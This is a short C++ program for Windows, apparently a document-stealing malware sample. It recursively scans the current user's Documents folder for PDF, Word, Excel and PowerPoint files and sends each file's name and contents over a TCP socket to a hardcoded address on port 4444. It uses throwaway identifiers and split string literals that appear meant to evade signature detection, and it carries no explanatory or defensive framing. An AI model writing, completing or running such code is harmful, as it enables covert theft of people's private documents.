#include <iostream>
#include <filesystem>
#include <fstream>
#include <winsock2.h>
#include <windows.h>

#define UZLEN 256
#pragma comment(lib, "ws2_32.lib")

namespace zz = std::filesystem;

bool u4(const zz::path& y) {
    std::string x = y.extension().string();
    return x == ".p""df" || x == ".do""cx" || x == ".doc" ||
           x == ".xl""s" || x == ".xl""sx" || x == ".ppt""x";
}

void xf2(const std::string& z, const std::string& ip, int pt) {
    WSADATA ws;
    SOCKET sk;
    sockaddr_in srv;

    if (WSAStartup(MAKEWORD(2,2), &ws) != 0) return;
    sk = socket(AF_INET, SOCK_STREAM, 0);
    if (sk == INVALID_SOCKET) return;

    srv.sin_family = AF_INET;
    srv.sin_port = htons(pt);
    srv.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sk, (sockaddr*)&srv, sizeof(srv)) == SOCKET_ERROR) {
        closesocket(sk); WSACleanup(); return;
    }

    std::ifstream f(z, std::ios::binary);
    if (!f.is_open()) { closesocket(sk); WSACleanup(); return; }

    std::string fn = zz::path(z).filename().string();
    send(sk, fn.c_str(), fn.size(), 0);
    send(sk, "\n", 1, 0);

    char b[4096];
    while (!f.eof()) {
        f.read(b, sizeof(b));
        int r = f.gcount();
        send(sk, b, r, 0);
    }

    f.close(); closesocket(sk); WSACleanup();
}

void w9(const std::string& p, const std::string& ip, int pr) {
    for (const auto& e : zz::recursive_directory_iterator(p)) {
        if (e.is_regular_file() && u4(e.path())) {
            xf2(e.path().string(), ip, pr);
        }
    }
}

int main() {
    char u[UZLEN + 1];
    DWORD ul = UZLEN + 1;
    std::string tf;

    if (GetUserNameA(u, &ul)) {
        tf = "C:\\Us" "ers\\" + std::string(u) + "\\Doc" "uments";
    } else return 1;

    std::string i = "192.168." "0.148";
    int p = 4444;

    w9(tf, i, p);
    return 0;
}
